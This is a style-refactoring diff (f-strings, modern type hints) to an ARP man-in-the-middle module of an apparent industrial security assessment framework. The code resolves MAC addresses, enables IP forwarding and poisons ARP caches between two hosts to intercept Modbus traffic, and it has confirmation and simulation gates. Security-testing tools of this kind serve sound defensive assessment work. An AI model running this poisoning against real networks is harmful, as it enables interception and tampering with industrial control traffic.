@@ -57,7 +57,7 @@ from industrialxpl.core.exploit import (
 )
 
 
-def _get_mac_via_arp(target_ip: str, iface: str, timeout: float = 3.0) -> Optional[bytes]:
+def _get_mac_via_arp(target_ip: str, iface: str, timeout: float = 3.0) -> bytes | None:
     """Resolve MAC address of target_ip using a raw ARP request."""
     try:
         ETH_P_ARP = 0x0806
@@ -107,7 +107,7 @@ def _get_mac_via_arp(target_ip: str, iface: str, timeout: float = 3.0) -> Option
                 if sender_ip == dst_ip:
                     sock.close()
                     return sender_mac
-            except socket.timeout:
+            except TimeoutError:
                 break
         sock.close()
     except Exception:
@@ -115,7 +115,7 @@ def _get_mac_via_arp(target_ip: str, iface: str, timeout: float = 3.0) -> Option
     return None
 
 
-def _get_iface_mac(iface: str) -> Optional[bytes]:
+def _get_iface_mac(iface: str) -> bytes | None:
     """Get MAC address of local interface."""
     try:
         import fcntl
@@ -130,7 +130,7 @@ def _get_iface_mac(iface: str) -> Optional[bytes]:
         return None
 
 
-def _get_iface_ip(iface: str) -> Optional[str]:
+def _get_iface_ip(iface: str) -> str | None:
     """Get IPv4 address of local interface."""
     try:
         import fcntl
@@ -167,11 +167,11 @@ def _send_arp(
     sock.send(frame)
 
 
-def _enable_ip_forward() -> Optional[str]:
+def _enable_ip_forward() -> str | None:
     """Enable IPv4 forwarding; return previous value for cleanup."""
     fwd_path = "/proc/sys/net/ipv4/ip_forward"
     try:
-        with open(fwd_path, "r") as f:
+        with open(fwd_path) as f:
             prev = f.read().strip()
         if prev == "1":
             print_info("[ARP MITM] IP forwarding already enabled.")
@@ -181,18 +181,18 @@ def _enable_ip_forward() -> Optional[str]:
         print_status("[ARP MITM] IP forwarding enabled.")
         return prev
     except Exception as exc:
-        print_warning("[ARP MITM] Cannot set IP forward: {} - run as root.".format(exc))
+        print_warning(f"[ARP MITM] Cannot set IP forward: {exc} - run as root.")
         return None
 
 
-def _restore_ip_forward(prev: Optional[str]) -> None:
+def _restore_ip_forward(prev: str | None) -> None:
     fwd_path = "/proc/sys/net/ipv4/ip_forward"
     if prev is None or prev == "1":
         return
     try:
         with open(fwd_path, "w") as f:
             f.write(prev)
-        print_status("[ARP MITM] IP forwarding restored to {}.".format(prev))
+        print_status(f"[ARP MITM] IP forwarding restored to {prev}.")
     except Exception:
         pass
 
@@ -245,11 +245,8 @@ class Exploit(_Exploit):
             DestructiveGate.print_simulation(
                 description=(
                     "Would perform bidirectional ARP cache poisoning between "
-                    "{h1} and {h2} on interface {iface}, re-sending every {iv}s "
-                    "to intercept all traffic between them.".format(
-                        h1=self.host1, h2=self.host2,
-                        iface=self.iface, iv=self.interval,
-                    )
+                    f"{self.host1} and {self.host2} on interface {self.iface}, re-sending every {self.interval}s "
+                    "to intercept all traffic between them."
                 ),
                 mitre_techniques=["T0830", "T0861"],
             )
@@ -261,31 +258,31 @@ class Exploit(_Exploit):
 
         if not DestructiveGate.require_confirmation(
             module_name="assessment/lateral/modbus_arp_mitm",
-            target="{} <-> {}".format(self.host1, self.host2),
+            target=f"{self.host1} <-> {self.host2}",
             impact_level="HIGH",
-            description="Bidirectional ARP poisoning between {} and {}".format(self.host1, self.host2),
+            description=f"Bidirectional ARP poisoning between {self.host1} and {self.host2}",
         ):
             return
 
         src_mac = _get_iface_mac(self.iface)
         if not src_mac:
-            print_error("[ARP MITM] Cannot get MAC for interface {}.".format(self.iface))
+            print_error(f"[ARP MITM] Cannot get MAC for interface {self.iface}.")
             return
 
         print_status("[ARP MITM] Resolving target MAC addresses...")
         mac1 = _get_mac_via_arp(self.host1, self.iface)
         if not mac1:
-            print_error("[ARP MITM] Cannot resolve MAC for {} - check ARP reachability.".format(self.host1))
+            print_error(f"[ARP MITM] Cannot resolve MAC for {self.host1} - check ARP reachability.")
             return
         mac2 = _get_mac_via_arp(self.host2, self.iface)
         if not mac2:
-            print_error("[ARP MITM] Cannot resolve MAC for {} - check ARP reachability.".format(self.host2))
+            print_error(f"[ARP MITM] Cannot resolve MAC for {self.host2} - check ARP reachability.")
             return
 
-        h1_mac_str = ":".join("{:02x}".format(b) for b in mac1)
-        h2_mac_str = ":".join("{:02x}".format(b) for b in mac2)
-        print_success("[ARP MITM] {} -> {}".format(self.host1, h1_mac_str))
-        print_success("[ARP MITM] {} -> {}".format(self.host2, h2_mac_str))
+        h1_mac_str = ":".join(f"{b:02x}" for b in mac1)
+        h2_mac_str = ":".join(f"{b:02x}" for b in mac2)
+        print_success(f"[ARP MITM] {self.host1} -> {h1_mac_str}")
+        print_success(f"[ARP MITM] {self.host2} -> {h2_mac_str}")
 
         prev_forward = _enable_ip_forward()
 
@@ -298,11 +295,11 @@ class Exploit(_Exploit):
             _restore_ip_forward(prev_forward)
             return
         except Exception as exc:
-            print_error("[ARP MITM] Raw socket error: {}".format(exc))
+            print_error(f"[ARP MITM] Raw socket error: {exc}")
             _restore_ip_forward(prev_forward)
             return
 
-        print_success("[ARP MITM] Poisoning started. Use Wireshark on {} to capture traffic.".format(self.iface))
+        print_success(f"[ARP MITM] Poisoning started. Use Wireshark on {self.iface} to capture traffic.")
         print_info("[ARP MITM] Press Ctrl+C to stop and restore ARP tables.")
 
         deadline = time.time() + self.duration if self.duration > 0 else None
